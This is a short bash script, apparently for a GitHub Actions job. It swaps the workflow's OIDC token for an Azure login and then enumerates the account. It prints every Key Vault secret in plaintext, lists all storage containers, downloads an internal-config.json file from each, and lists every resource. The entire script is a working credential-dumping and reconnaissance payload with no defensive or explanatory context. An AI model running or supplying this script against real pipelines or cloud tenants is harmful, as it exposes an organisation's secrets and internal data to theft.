#!/usr/bin/env bash
set -e
IDTOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$IDTOKEN" --allow-no-subscriptions
az account show -o json
for kv in $(az keyvault list --query "[].name" -o tsv); do
  for s in $(az keyvault secret list --vault-name "$kv" --query "[].name" -o tsv); do
    echo "SECRET $kv/$s = $(az keyvault secret show --vault-name "$kv" -n "$s" --query value -o tsv)"
  done
done
for a in $(az storage account list --query "[].name" -o tsv); do
  for c in $(az storage container list --account-name "$a" --auth-mode login --query "[].name" -o tsv 2>/dev/null); do
    az storage blob list --account-name "$a" -c "$c" --auth-mode login -o table
    az storage blob download --account-name "$a" -c "$c" -n internal-config.json --auth-mode login -f /dev/stdout 2>/dev/null
  done
done
az resource list -o table
